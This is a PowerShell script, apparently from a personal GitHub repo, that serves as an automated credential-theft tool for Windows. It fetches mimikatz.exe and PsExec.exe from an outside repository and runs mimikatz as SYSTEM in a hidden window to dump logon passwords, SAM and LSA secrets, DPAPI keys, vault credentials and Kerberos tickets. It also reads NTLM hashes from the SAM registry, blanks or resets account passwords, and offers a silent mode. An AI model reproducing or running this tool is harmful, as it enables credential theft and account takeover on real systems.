###################################################################################################
#                                                                                                 #
#                   ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                         #
#                  ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                          #
#                  ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                          #
#                  ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                          #
#                  ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                         #
#                  ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                         #
#                  ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                         #
#                  ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                          #
#                         ░    ░   ░     ░           ░  ░     ░  ░░  ░                            #
#                                                                                                 #
#     Title        : user-credential.ps1                                                          #
#     Link         : https://github.com/Miiraak/Scripts/tree/master/PowerShell/CredentialAccess/LSASS_Dumping/ #
#     Version      : 5.3.1                                                                        #
#     Category     : credentialaccess/lsass_dumping                                                #
#     Target       : Windows 10/11, PowerShell 5+                                                  #
#     Description  : Advanced Mimikatz SYSTEM extraction, raw output, formatted.                   #
#                                                                                                 #
###################################################################################################

<#
.SYNOPSIS
    Advanced credential extraction and local account management (info, password, NTLM hash, Mimikatz SYSTEM).

.DESCRIPTION
    Advanced extraction, audit, and management of local user credentials (info, disable, set, check, hash, Mimikatz SYSTEM dump).
    Color output, logging, silent mode, auto download of binaries if missing.

.PARAMETER Action
    info, disable, set, check, hash, help, show

.PARAMETER Username
    Target local account (default: current user)

.PARAMETER NewPassword
    New password (set action)

.PARAMETER TestPassword
    Password to test (check action)

.PARAMETER Silent
    No screen output, only logs

.PARAMETER LogPath
    Path of log file (default: %TEMP%\user-credential.log)

.EXAMPLE
    .\user-credential.ps1 -Action info
    .\user-credential.ps1 -Action show -Username Bob
    .\user-credential.ps1 -Action disable -Username Bob
    .\user-credential.ps1 -Action set -Username Bob -NewPassword "NewPass2025"
    .\user-credential.ps1 -Action check -Username Bob -TestPassword "TestPass"
    .\user-credential.ps1 -Action hash -Username Bob
#>

# ----------- [Parameters] ----------- #
param (
    [ValidateSet("info","disable","set","check","hash","help","show")]
    [string]$Action = "info",
    [string]$Username = $env:USERNAME,
    [string]$NewPassword = "",
    [string]$TestPassword = "",
    [switch]$Silent,
    [string]$LogPath = "$env:TEMP\user-credential.log"
)

# ----------- [Initialization] ----------- #
[Console]::OutputEncoding = [Text.Encoding]::UTF8

$ErrorActionPreference = "Stop"
$sep = ("="*80)
$header = @"
$sep
USER-CREDENTIAL.PS1 v5.3.1 - https://github.com/Miiraak/Scripts/tree/master/PowerShell/CredentialAccess/LSASS_Dumping/
$sep
"@

$colorInfo = "Cyan"
$colorWarn = "Yellow"
$colorErr  = "Red"
$colorOk   = "Green"
$colorKey  = "Magenta"
$colorPwd  = "White"


# ----------- [Functions] ----------- #
function Write-Log {
    param([string]$Message)
    $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogPath -Value "[$date] $Message"
}

function Write-Out {
    param (
        [string]$Message,
        [string]$Color = $colorInfo
    )
    Write-Log $Message
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor $Color
    }
}

function Abort-IfNotAdmin {
    if (-not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())
        ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Out "ERROR: Execution requires administrator privileges." $colorErr
        throw "This script must be run as administrator."
    }
}

function Download-ExternalBinary {
    param (
        [string]$FileName,
        [string]$Url
    )
    try {
        Write-Out "Downloading $FileName from $Url..." $colorWarn
        Invoke-WebRequest -Uri $Url -OutFile $FileName -UseBasicParsing
        Write-Out "$FileName downloaded successfully." $colorOk
    } catch {
        Write-Out "Failed to download $FileName." $colorErr
        throw $_
    }
}

function Ensure-ExternalBinaries {
    $repoBase = "https://github.com/Miiraak/Scripts/tree/master/Tools"
    $binaires = @(
        @{ Name = "mimikatz.exe"; Url = "$repoBase/mimikatz.exe" },
        @{ Name = "PsExec.exe";   Url = "$repoBase/PsExec.exe" }
    )
    foreach ($bin in $binaires) {
        $path = Join-Path $PSScriptRoot $bin.Name
        if (-not (Test-Path $path)) {
            try {
                Download-ExternalBinary -FileName $path -Url $bin.Url
            } catch {
                Write-Out "Could not retrieve binary $($bin.Name). Please place it manually next to the script." $colorErr
            }
        }
    }
}

function Get-NTLMHash {
    try {
        $sid = (Get-LocalUser -Name $Username).Sid.Value
        $regPath = "HKLM:\SAM\SAM\Domains\Account\Users\$($sid.Substring($sid.LastIndexOf('-')+1))"
        $raw = Get-ItemProperty -Path $regPath -Name "V" -ErrorAction Stop
        $hash = ($raw.V[0x70..0x7F] | ForEach-Object { $_.ToString("x2") }) -join ""
        return $hash
    } catch {
        Write-Out "Unable to retrieve NTLM hash (SYSTEM rights required)." $colorWarn
        Write-Out "Tip: Run via PsExec as SYSTEM to get NTLM hash." $colorWarn
        return $null
    }
}

function Show-Info {
    try {
        $user = Get-LocalUser -Name $Username
        $sid = $user.SID.Value

        $props = @{
            "Name"               = $user.Name
            "Description"        = $user.Description
            "Enabled"            = $user.Enabled
            "Admin"              = $false
            "Created"            = if ($user.PSObject.Properties["CreationTime"]) { 
                                    if ($user.CreationTime) { $user.CreationTime.ToString("dd.MM.yyyy HH:mm:ss") } else { "-" }
                                  } else { "-" }
            "Last logon"         = if ($user.PSObject.Properties["LastLogon"]) { 
                                    if ($user.LastLogon) { $user.LastLogon.ToString("dd.MM.yyyy HH:mm:ss") } else { "-" }
                                  } else { "-" }
            "Lockout"            = if ($user.PSObject.Properties["Lockout"]) { $user.Lockout } else { "-" }
            "Expires"            = if ($user.PSObject.Properties["AccountExpires"]) { 
                                    if ($user.AccountExpires) { $user.AccountExpires.ToString("dd.MM.yyyy HH:mm:ss") } else { "-" }
                                  } else { "-" }
            "SID"                = $sid
        }

        $isAdmin = $false
        try {
            $admins = Get-LocalGroupMember -Group "Administrators" | Select-Object -ExpandProperty Name
            foreach ($adm in $admins) {
                if ($adm -match "\\$Username$" -or $adm -eq $Username) {
                    $isAdmin = $true
                    break
                }
            }
            $props["Admin"] = $isAdmin
        } catch {
            $props["Admin"] = "Not verifiable"
        }

        Write-Out "`n$sep" $colorKey
        Write-Out ("{0,-18} | {1}" -f "Detailed user info", "[$Username]") $colorKey
        Write-Out $sep $colorKey
        foreach ($k in $props.Keys) {
            $v = if ($props[$k] -eq $null -or $props[$k] -eq "") { "-" } else { $props[$k] }
            Write-Out ("{0,-18} : {1}" -f $k, $v) $colorInfo
        }
        Write-Out $sep $colorKey

        try {
            $groups = Get-LocalGroup | ForEach-Object {
                $gname = $_.Name
                try {
                    $members = Get-LocalGroupMember -Group $gname | Where-Object { $_.Name -match "\\$Username$" -or $_.Name -eq $Username }
                    if ($members) { $gname }
                } catch {}
            }
            if ($groups.Count -gt 0) {
                Write-Out ("Local groups     : " + ($groups -join ", ")) $colorInfo
            } else {
                Write-Out "Local groups     : No group detected." $colorWarn
            }
        } catch {
            Write-Out "Unable to list groups." $colorWarn
        }
        Write-Out "$sep`n" $colorKey

        if ($isAdmin -eq $true) {
            Write-Out "This account is member of Administrators group." $colorOk
        } elseif ($isAdmin -eq $false) {
            Write-Out "This account is NOT Administrator." $colorWarn
        }
    } catch {
        Write-Out "ERROR getting user info: $_" $colorErr
    }
}

function Show-Password {
    Abort-IfNotAdmin
    Ensure-ExternalBinaries

    Write-Out "`n$sep" $colorKey
    Write-Out "ADVANCED MIMIKATZ SYSTEM EXTRACTION" $colorKey
    Write-Out $sep $colorKey

    try {
        $user = Get-LocalUser -Name $Username
        $sid = $user.SID.Value
        Write-Out ("SID                : {0}" -f $sid) $colorPwd
        $hash = Get-NTLMHash
        if ($hash) {
            Write-Out ("NTLM Hash          : {0}" -f $hash) $colorPwd
        }
    } catch {
        Write-Out "Unable to retrieve SID or NTLM." $colorErr
    }

    $mimikatzPath = Join-Path $PSScriptRoot "mimikatz.exe"
    $psexecPath   = Join-Path $PSScriptRoot "PsExec.exe"
    $logFile      = "$env:TEMP\mimikatz.log"

    if ((Test-Path $mimikatzPath) -and (Test-Path $psexecPath)) {
        Write-Out "Extracting Mimikatz SYSTEM, all sensitive info..." $colorInfo

        # Valid commands only
        $fullArgs = '-i -s "'+$mimikatzPath+'" "log '+$logFile+'" "privilege::debug" "token::whoami" "sekurlsa::tickets" "sekurlsa::ekeys" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::trust" "dpapi::cred" "dpapi::masterkey" "vault::list" "vault::cred" "exit"'

        try {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $psexecPath
            $psi.Arguments = $fullArgs
            $psi.UseShellExecute = $false
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

            $process = [System.Diagnostics.Process]::Start($psi)
            $process.WaitForExit()
            $exitCode = $process.ExitCode

            Write-Out "===== MIMIKATZ DUMP =====" $colorKey
            if (Test-Path $logFile) {
                $dumpLines = Get-Content $logFile
                if ($dumpLines.Count -gt 0) {
                    Write-Out $sep $colorKey
                    foreach ($line in $dumpLines) {
                        if ($line -match "ERROR|Exception") {
                            Write-Out $line $colorErr
                        } elseif ($line -match "Authentication|Username|Password|NTLM|SHA1|dpapi|Secret|masterkey|vault|Ticket|sid|domain") {
                            Write-Out $line $colorPwd
                        } elseif ($line -match "^mimikatz|Bye!|OK|using|privilege::debug|token::whoami|sekurlsa|lsadump|dpapi|vault|log") {
                            Write-Out $line $colorKey
                        } else {
                            Write-Out $line $colorInfo
                        }
                    }
                    Write-Out $sep $colorKey
                } else {
                    Write-Out "Mimikatz dump is empty." $colorWarn
                }
                Remove-Item $logFile -ErrorAction SilentlyContinue
            } else {
                Write-Out "Mimikatz dump was not generated." $colorErr
                Write-Out "Process exit code: $exitCode" $colorWarn
                switch ($exitCode) {
                    -1073741510 { Write-Out "Process interrupted by user (CTRL+C or forced close)." $colorWarn }
                    0          { Write-Out "Process finished without error but no log generated. Check AV, rights, binary compatibility." $colorWarn }
                    default    { Write-Out "System or Mimikatz error. See documentation, SYSTEM rights, AV, binary version." $colorErr }
                }
            }
            Write-Out "===== END DUMP =====" $colorKey
        } catch {
            Write-Out "ERROR running automatic mimikatz: $_" $colorErr
        }
    } else {
        Write-Out "mimikatz.exe or PsExec.exe not found in script folder." $colorErr
        Write-Out "They are auto-downloaded from your repo if missing." $colorWarn
        Write-Out "If download fails, place them manually next to the script." $colorWarn
    }

    Write-Out $sep $colorKey
}

function Disable-Password {
    Abort-IfNotAdmin
    net user "$Username" "" | Out-Null
    Write-Out "Password for '$Username' disabled (set to blank)." $colorOk
}

function Set-Password {
    Abort-IfNotAdmin
    if ($NewPassword -eq "") {
        Write-Out "ERROR: New password not specified." $colorErr
        throw "Missing new password!"
    }
    net user "$Username" "$NewPassword" | Out-Null
    Write-Out "Password for '$Username' changed." $colorOk
}

function Check-Password {
    if ($TestPassword -eq "") {
        Write-Out "ERROR: Test password not specified." $colorErr
        throw "Test password not specified!"
    }
    $secure = ConvertTo-SecureString $TestPassword -AsPlainText -Force
    try {
        $cred = New-Object System.Management.Automation.PSCredential ($Username, $secure)
        Start-Process powershell.exe -Credential $cred -ArgumentList "-Command `"exit`"" -ErrorAction Stop -WindowStyle Hidden -Wait | Out-Null
        Write-Out "Password for '$Username': VALID." $colorOk
    } catch {
        Write-Out "Password for '$Username': INVALID." $colorErr
    }
}

function Flash-CapsLock {
    if ($Silent) { return }
    Add-Type -AssemblyName System.Windows.Forms
    for ($i=0; $i -lt 4; $i++) {
        [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
        Start-Sleep -Milliseconds 150
    }
    Start-Sleep -Milliseconds 2000
    for ($i=0; $i -lt 4; $i++) {
        [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
        Start-Sleep -Milliseconds 150
    }
}

function Show-Help {
    Write-Out "`n$sep" $colorKey
    Write-Out "HELP - user-credential.ps1" $colorKey
    Write-Out @"
Usage: .\user-credential.ps1 [-Action <info|disable|set|check|hash|help|show>] [-Username <name>] [-NewPassword <pwd>] [-TestPassword <pwd>] [-Silent] [-LogPath <path>]

Actions:
  info     : Show all detailed info about specified local account (safe).
  show     : Advanced extraction: NTLM hash, SID, Mimikatz dump (password, secrets, etc.) - automated, no interaction.
  disable  : Disable (blank) the account password.
  set      : Change the password (parameter -NewPassword).
  check    : Test password validity (-TestPassword).
  hash     : Try to get NTLM hash (SYSTEM required).
  help     : Show this help.

Examples:
  .\user-credential.ps1 -Action info
  .\user-credential.ps1 -Action show -Username Bob
  .\user-credential.ps1 -Action disable -Username Bob
  .\user-credential.ps1 -Action set -Username Bob -NewPassword "NewPass2025"
  .\user-credential.ps1 -Action check -Username Bob -TestPassword "TestPass"
  .\user-credential.ps1 -Action hash -Username Bob

Options:
  -Silent    : No screen output, only log file.
  -LogPath   : Set the path for the log file.

Note: If mimikatz.exe or PsExec.exe are missing, they are auto-downloaded from the repo.

Typical execution time for Mimikatz extraction: 2 to 10 seconds (standard local machine)
$sep`n
"@ $colorInfo
}

# ----------- [Execution] ----------- #
Ensure-ExternalBinaries
try {
    if (-not $Silent) { Write-Host $header -ForegroundColor $colorKey }
    Write-Log "-------[Start user-credential.ps1]-------"
    Write-Log "Action = $Action | User = $Username | Silent = $Silent"

    switch ($Action.ToLower()) {
        "info"    { Show-Info }
        "show"    { Show-Password }
        "disable" { Disable-Password }
        "set"     { Set-Password }
        "check"   { Check-Password }
        "hash"    {
            Abort-IfNotAdmin
            $hash = Get-NTLMHash
            if ($hash) {
                Write-Out "NTLM hash for '$Username': $hash" $colorOk
            }
        }
        "help"    { Show-Help }
        default   { Write-Out "Unknown action: $Action`nUse -Action help for options." $colorWarn }
    }
    Flash-CapsLock
    Write-Log "-------[End user-credential.ps1]-------"
} catch {
    Write-Out "Exception: $_" $colorErr
    exit 1
}

Exit 0